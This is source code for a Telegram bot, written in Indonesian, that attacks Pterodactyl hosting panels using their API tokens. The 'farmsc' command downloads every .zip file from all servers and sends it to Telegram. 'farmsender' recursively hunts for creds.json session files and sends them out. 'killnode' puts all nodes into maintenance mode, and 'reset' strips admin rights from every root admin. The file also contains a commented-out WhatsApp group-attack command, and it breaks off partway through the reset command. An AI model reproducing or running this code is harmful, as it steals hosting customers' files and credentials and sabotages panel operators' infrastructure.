  const sentMessage = await ctx.replyWithPhoto(randomImage, {
    caption: `
<blockquote><b>ZYNOS BUGS</b></blockquote>
       Pengirim : ${username}
      Target   : ${groupJid}
      Status   : Memproses...
      Waktu    : ${date}
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: `https://chat.whatsapp.com/` }]]
    }
  });

  try {
    // Panggil fungsi groupBan
    await groupBan(sock, groupJid);
    
    // Edit caption pesan
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote><b>ZYNOS BUGS</b></blockquote>
       Pengirim : ${username}
      Target   : ${groupJid}
      Status   : ✅ Sukses! Nomor 13135550002 ditambahkan.
      Waktu    : ${date}
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK GRUP", url: `https://wa.me/13135550002` }]]
        }
      }
    );
  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote><b>ZYNOS BUGS</b></blockquote>
      Pengirim : ${username}
      Target   : ${groupJid}
      Status   : ❌ Gagal: ${err.message}
      Waktu    : ${date}
`,
      {
        parse_mode: "HTML"
      }
    );
  }
});
*/

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

//// COMMAND PANEL /////
// ====== FARMS C ======
bot.command("farmsc", checkCmd("farmsc"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTC) {
    return ctx.reply("❌ *PLTC TOKEN NOT SET!*\n\nSet PTERO_PLTC di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  const chatId = ctx.chat.id.toString();

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🔥 OXYLUS PREMIUM HARVESTER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Memulai Scanning...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari semua server...
    `,
    parse_mode: "HTML"
  });

  let totalServers = 0;
  let totalZip = 0;
  let successSend = 0;

  try {
    // 1. FETCH SERVERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🔥 OXYLUS PREMIUM HARVESTER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Fetching Servers...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const serversRes = await axios.get(`${host}/api/application/servers`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const servers = serversRes.data.data || [];
    totalServers = servers.length;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🔥 OXYLUS PREMIUM HARVESTER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalServers} Servers
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Memindai ${totalServers} server...
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SERVER
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const sID = server.attributes.identifier;
      const sInternalID = server.attributes.id;
      const sName = server.attributes.name;

      // UPDATE PROGRESS
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🔥 OXYLUS PREMIUM HARVESTER 🔥</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} (${sID})
📦 Scanning zip files...
    `,
        { parse_mode: "HTML" }
      );

      try {
        const filesRes = await axios.get(`${host}/api/client/servers/${sID}/files/list`, {
          headers: { 
            'Authorization': `Bearer ${PTERO_PLTC}`, 
            'Accept': 'application/json' 
          },
          timeout: 8000
        });

        const zipFiles = filesRes.data.data.filter(f => f.attributes.name.endsWith('.zip'));

        if (zipFiles.length === 0) {
          continue;
        }

        totalZip += zipFiles.length;

        for (const zip of zipFiles) {
          const fileName = zip.attributes.name;

          // AMBIL DOWNLOAD LINK
          const dlRes = await axios.get(`${host}/api/client/servers/${sID}/files/download?file=%2F${fileName}`, {
            headers: { 
              'Authorization': `Bearer ${PTERO_PLTC}`, 
              'Accept': 'application/json' 
            },
            timeout: 8000
          });

          const dlUrl = dlRes.data.attributes.url;
          const filePath = path.join(__dirname, fileName);

          // DOWNLOAD FILE KE VPS
          const writer = fs.createWriteStream(filePath);
          const response = await axios({ 
            url: dlUrl, 
            method: 'GET', 
            responseType: 'stream',
            timeout: 30000
          });
          response.data.pipe(writer);
          await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
          });

          // UPLOAD KE TELEGRAM
          const form = new FormData();
          form.append('chat_id', chatId);
          form.append('document', fs.createReadStream(filePath));
          form.append('caption', 
            `🔥 **OXYLUS PREMIUM HARVEST** 🔥\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `📦 **FILE ZIP** : \`${fileName}\`\n` +
            `🖥️ **SERVER** : \`${sName}\`\n` +
            `🆔 **ID SERVER** : \`${sID}\`\n` +
            `📡 **PANEL** : \`${host}\``
          );

          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 60000
          });

          // HAPUS FILE LOKAL
          fs.unlinkSync(filePath);
          successSend++;

          // KIRIM NOTIF KE CHAT
          await ctx.reply(`✅ **ZIP SENT!**\n📦 ${fileName}\n🖥️ ${sName}`, { parse_mode: 'Markdown' });
        }

      } catch (err) {
        console.log(`[FARMSC] Skip server ${sID}: ${err.message}`);
        continue;
      }
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ OXYLUS PREMIUM HARVEST COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Server: ${totalServers}
📦 Total ZIP: ${totalZip}
✅ Berhasil Kirim: ${successSend}
🔥 Status: DONE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR HARVESTER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END FARMS C ======

// ====== FARM SENDER (CREDS HARVESTER) ======
bot.command("farmsender", checkCmd("farmsender"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN, PTERO_PLTA, PTERO_PLTC di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTC) {
    return ctx.reply("❌ *PLTC TOKEN NOT SET!*\n\nSet PTERO_PLTC di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  const chatId = ctx.chat.id.toString();

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>💎 RANGZ CSESSIONS HARVESTER 💎</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Memulai Scanning Creds...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari creds.json di semua server...
    `,
    parse_mode: "HTML"
  });

  let totalServers = 0;
  let foundCreds = 0;
  let sentCreds = 0;

  // FUNGSI DEEP SCAN
  async function deepScan(sID, sName, dir = '') {
    try {
      const encodedDir = encodeURIComponent(dir || '/');
      const filesRes = await axios.get(`${host}/api/client/servers/${sID}/files/list?directory=${encodedDir}`, {
        headers: {
          'Authorization': `Bearer ${PTERO_PLTC}`,
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        timeout: 8000
      });

      const files = filesRes.data.data || [];

      for (const file of files) {
        const fName = file.attributes.name;
        const isDirectory = file.attributes.mimetype === 'application/x-directory' || !fName.includes('.');
        const fPath = dir ? `${dir}/${fName}` : fName;

        // KALAU NEMU creds.json
        if (fName === 'creds.json') {
          foundCreds++;
          
          // UPDATE PROGRESS
          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            msg.message_id,
            null,
            `
<blockquote>💎 RANGZ CSESSIONS HARVESTER 💎</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found creds.json #${foundCreds}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName}
📍 Path: ${fPath}
📤 Mengirim ke Telegram...
    `,
            { parse_mode: "HTML" }
          );

          // DOWNLOAD & SEND
          try {
            const fixedFileName = 'creds.json';
            const tempPath = path.join(__dirname, fixedFileName);

            const dlRes = await axios.get(`${host}/api/client/servers/${sID}/files/download?file=%2F${encodeURIComponent(fPath)}`, {
              headers: { 'Authorization': `Bearer ${PTERO_PLTC}`, 'Accept': 'application/json' },
              timeout: 10000
            });

            const dlUrl = dlRes.data.attributes.url;

            // DOWNLOAD KE VPS
            const writer = fs.createWriteStream(tempPath);
            const response = await axios({
              url: dlUrl,
              method: 'GET',
              responseType: 'stream',
              timeout: 30000
            });
            response.data.pipe(writer);
            await new Promise((resolve, reject) => {
              writer.on('finish', resolve);
              writer.on('error', reject);
            });

            // UPLOAD KE TELEGRAM
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('document', fs.createReadStream(tempPath), { filename: fixedFileName });
            form.append('caption', 
              `💎 **RANGZ CSESSIONS SUCCESSFULLY** 💎\n` +
              `━━━━━━━━━━━━━━━━━━━━\n` +
              `📂 **FILE** : \`creds.json\`\n` +
              `📍 **PATH** : \`${fPath}\`\n` +
              `🖥️ **SERVER** : \`${sName}\`\n` +
              `🌐 **DOMAIN** : ${host}`
            );

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
              headers: form.getHeaders(),
              timeout: 60000
            });

            fs.unlinkSync(tempPath);
            sentCreds++;

            // KIRIM NOTIF KE CHAT
            await ctx.reply(`✅ **CREDS FOUND & SENT!**\n🖥️ ${sName}\n📍 ${fPath}`, { parse_mode: 'Markdown' });

          } catch (err) {
            console.log(`[FARMSENDER] Gagal kirim creds dari ${sName}: ${err.message}`);
          }
        }

        // REKURSIF MASUK FOLDER (skip folder gak penting)
        if (isDirectory && fName !== 'node_modules' && fName !== '.npm' && fName !== '.git') {
          await deepScan(sID, sName, fPath);
        }
      }
    } catch (e) {
      // Silent skip kalo error
    }
  }

  try {
    // 1. FETCH SERVERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>💎 RANGZ CSESSIONS HARVESTER 💎</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Fetching Servers...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const serversRes = await axios.get(`${host}/api/application/servers`, {
      headers: {
        'Authorization': `Bearer ${PTERO_PLTA}`,
        'Accept': 'application/json'
      },
      timeout: 10000
    });

    const servers = serversRes.data.data || [];
    totalServers = servers.length;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>💎 RANGZ CSESSIONS HARVESTER 💎</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalServers} Servers
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Scanning ${totalServers} server...
🔍 Mencari creds.json di semua folder
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA SERVER
    for (let i = 0; i < servers.length; i++) {
      const server = servers[i];
      const sID = server.attributes.identifier;
      const sName = server.attributes.name;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>💎 RANGZ CSESSIONS HARVESTER 💎</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalServers}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Server: ${sName} (${sID})
🔍 Scanning all folders...
📦 Found creds: ${foundCreds}
✅ Sent: ${sentCreds}
    `,
        { parse_mode: "HTML" }
      );

      await deepScan(sID, sName);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ RANGZ CSESSIONS HARVEST COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Server: ${totalServers}
📦 Found creds.json: ${foundCreds}
✅ Berhasil Kirim: ${sentCreds}
🔥 Status: DONE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR HARVESTER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END FARM SENDER ======

// ====== KILL NODE (MAINTENANCE ON) ======
bot.command("killnode", checkCmd("killnode"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN dan PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>☠️ NODE KILLER - MAINTENANCE MODE ☠️</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Mengambil daftar node...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari semua node di panel...
    `,
    parse_mode: "HTML"
  });

  let totalNodes = 0;
  let successNodes = 0;
  let failedNodes = 0;

  try {
    // 1. FETCH NODES
    const res = await axios.get(`${host}/api/application/nodes`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const nodes = res.data.data || [];
    totalNodes = nodes.length;

    if (totalNodes === 0) {
      return ctx.reply("❌ *TIDAK ADA NODE DITEMUKAN!*", { parse_mode: 'Markdown' });
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>☠️ NODE KILLER - MAINTENANCE MODE ☠️</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalNodes} Nodes
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
☠️ Mematikan semua node (Maintenance ON)...
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA NODE
    for (let i = 0; i < nodes.length; i++) {
      const node = nodes[i];
      const nData = node.attributes;
      const nId = nData.id;
      const nName = nData.name;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>☠️ NODE KILLER - MAINTENANCE MODE ☠️</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalNodes}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Node: ${nName} [ID: ${nId}]
☠️ Status: ⏳ Mematikan...
    `,
        { parse_mode: "HTML" }
      );

      try {
        await axios.patch(`${host}/api/application/nodes/${nId}`, {
          "name": nData.name,
          "location_id": nData.location_id,
          "fqdn": nData.fqdn,
          "scheme": nData.scheme,
          "memory": nData.memory,
          "memory_overallocate": nData.memory_overallocate,
          "disk": nData.disk,
          "disk_overallocate": nData.disk_overallocate,
          "daemon_listen": nData.daemon_listen,
          "daemon_sftp": nData.daemon_sftp,
          "maintenance_mode": true // KILL = MAINTENANCE ON
        }, {
          headers: {
            'Authorization': `Bearer ${PTERO_PLTA}`,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          timeout: 10000
        });

        successNodes++;

        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>☠️ NODE KILLER - MAINTENANCE MODE ☠️</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalNodes}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Node: ${nName} [ID: ${nId}]
☠️ Status: ✅ MAINTENANCE ON
    `,
          { parse_mode: "HTML" }
        );

      } catch (err) {
        failedNodes++;
        await ctx.reply(`❌ *GAGAL KILL NODE!*\n🖥️ ${nName}\n⚠️ ${err.response?.status || err.message}`, { parse_mode: 'Markdown' });
      }

      await sleep(500);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ NODE KILL COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Node: ${totalNodes}
☠️ Success Kill: ${successNodes}
❌ Failed: ${failedNodes}
🔥 Status: ALL NODE IN MAINTENANCE MODE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR NODE KILLER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END KILL NODE ======

// ====== START NODE (MAINTENANCE OFF) ======
bot.command("startnode", checkCmd("startnode"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN dan PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>🚀 NODE STARTER - ACTIVE MODE 🚀</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Mengambil daftar node...
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari semua node di panel...
    `,
    parse_mode: "HTML"
  });

  let totalNodes = 0;
  let successNodes = 0;
  let failedNodes = 0;

  try {
    // 1. FETCH NODES
    const res = await axios.get(`${host}/api/application/nodes`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const nodes = res.data.data || [];
    totalNodes = nodes.length;

    if (totalNodes === 0) {
      return ctx.reply("❌ *TIDAK ADA NODE DITEMUKAN!*", { parse_mode: 'Markdown' });
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>🚀 NODE STARTER - ACTIVE MODE 🚀</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalNodes} Nodes
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🚀 Menyalakan semua node (Maintenance OFF)...
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA NODE
    for (let i = 0; i < nodes.length; i++) {
      const node = nodes[i];
      const nData = node.attributes;
      const nId = nData.id;
      const nName = nData.name;

      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<blockquote>🚀 NODE STARTER - ACTIVE MODE 🚀</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalNodes}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Node: ${nName} [ID: ${nId}]
🚀 Status: ⏳ Menyalakan...
    `,
        { parse_mode: "HTML" }
      );

      try {
        await axios.patch(`${host}/api/application/nodes/${nId}`, {
          "name": nData.name,
          "location_id": nData.location_id,
          "fqdn": nData.fqdn,
          "scheme": nData.scheme,
          "memory": nData.memory,
          "memory_overallocate": nData.memory_overallocate,
          "disk": nData.disk,
          "disk_overallocate": nData.disk_overallocate,
          "daemon_listen": nData.daemon_listen,
          "daemon_sftp": nData.daemon_sftp,
          "maintenance_mode": false // START = MAINTENANCE OFF
        }, {
          headers: {
            'Authorization': `Bearer ${PTERO_PLTA}`,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          timeout: 10000
        });

        successNodes++;

        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<blockquote>🚀 NODE STARTER - ACTIVE MODE 🚀</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Progress: ${i + 1}/${totalNodes}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Node: ${nName} [ID: ${nId}]
🚀 Status: ✅ ACTIVE
    `,
          { parse_mode: "HTML" }
        );

      } catch (err) {
        failedNodes++;
        await ctx.reply(`❌ *GAGAL START NODE!*\n🖥️ ${nName}\n⚠️ ${err.response?.status || err.message}`, { parse_mode: 'Markdown' });
      }

      await sleep(500);
    }

    // 3. SELESAI
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>✅ NODE START COMPLETE ✅</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
🖥️ Total Node: ${totalNodes}
🚀 Success Start: ${successNodes}
❌ Failed: ${failedNodes}
🔥 Status: ALL NODE ACTIVE!
    `,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>❌ ERROR NODE STARTER ❌</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
⏰ Waktu: ${date}
━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR: ${err.message}
${err.response ? `📡 API Response: ${JSON.stringify(err.response.data)}` : ''}
    `,
      { parse_mode: "HTML" }
    );
  }
});
// ====== END START NODE ======

// ====== RESET ADMIN (DOWNGRADE ALL ADMINS) ======
bot.command("reset", checkCmd("reset"), checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : userId;
  const date = moment().tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');

  // CEK KONFIG
  if (!PTERO_DOMAIN) {
    return ctx.reply("❌ *PTERO CONFIG NOT SET!*\n\nSet PTERO_DOMAIN dan PTERO_PLTA di config.js");
  }

  if (!PTERO_PLTA) {
    return ctx.reply("❌ *PLTA TOKEN NOT SET!*\n\nSet PTERO_PLTA di config.js");
  }

  const host = PTERO_DOMAIN.replace(/\/$/, '');
  
  // Ambil exclude ID dari argumen (opsional)
  const args = ctx.message.text.split(" ");
  let excludedIds = [];
  if (args.length > 1) {
    excludedIds = args[1].split(',').map(id => id.trim());
  }

  // KIRIM PESAN AWAL
  const msg = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
<blockquote>👑 RESET ADMIN - DOWNGRADE ALL 👑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ⏳ Mengambil daftar user...
⏰ Waktu: ${date}
${excludedIds.length > 0 ? `🛡️ Exclude ID: ${excludedIds.join(', ')}` : '🛡️ Exclude: Tidak ada'}
━━━━━━━━━━━━━━━━━━━━
🔄 Mencari semua admin di panel...
    `,
    parse_mode: "HTML"
  });

  let totalAdmins = 0;
  let successDowngrade = 0;
  let failedDowngrade = 0;
  let skippedExcluded = 0;

  try {
    // 1. FETCH ALL USERS
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>👑 RESET ADMIN - DOWNGRADE ALL 👑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: 📡 Mengambil data user...
⏰ Waktu: ${date}
${excludedIds.length > 0 ? `🛡️ Exclude ID: ${excludedIds.join(', ')}` : '🛡️ Exclude: Tidak ada'}
━━━━━━━━━━━━━━━━━━━━
⏳ Menghubungi API Panel...
    `,
      { parse_mode: "HTML" }
    );

    const res = await axios.get(`${host}/api/application/users`, {
      headers: { 
        'Authorization': `Bearer ${PTERO_PLTA}`, 
        'Accept': 'application/json' 
      },
      timeout: 10000
    });

    const users = res.data.data || [];

    // Filter hanya admin
    const adminUsers = users.filter(user => user.attributes.root_admin === true);
    totalAdmins = adminUsers.length;

    if (totalAdmins === 0) {
      return ctx.reply("❌ *TIDAK ADA ADMIN DITEMUKAN!*", { parse_mode: 'Markdown' });
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>👑 RESET ADMIN - DOWNGRADE ALL 👑</blockquote>
📡 Target Panel: ${host}
👤 User: ${username}
📊 Status: ✅ Found ${totalAdmins} Admin
⏰ Waktu: ${date}
${excludedIds.length > 0 ? `🛡️ Exclude ID: ${excludedIds.join(', ')}` : '🛡️ Exclude: Tidak ada'}
━━━━━━━━━━━━━━━━━━━━
👑 Menurunkan pangkat semua admin...
    `,
      { parse_mode: "HTML" }
    );

    // 2. LOOP SEMUA ADMIN
    let processed = 0;
    for (const user of adminUsers) {
      const uData = user.attributes;
      const uId = uData.id.toString();
      const uName = uData.username;
      const uEmail = uData.email;

      // CEK APAKAH ID DI-EXCLUDE
      if (excludedIds.includes(uId)) {
        skippedExcluded++;
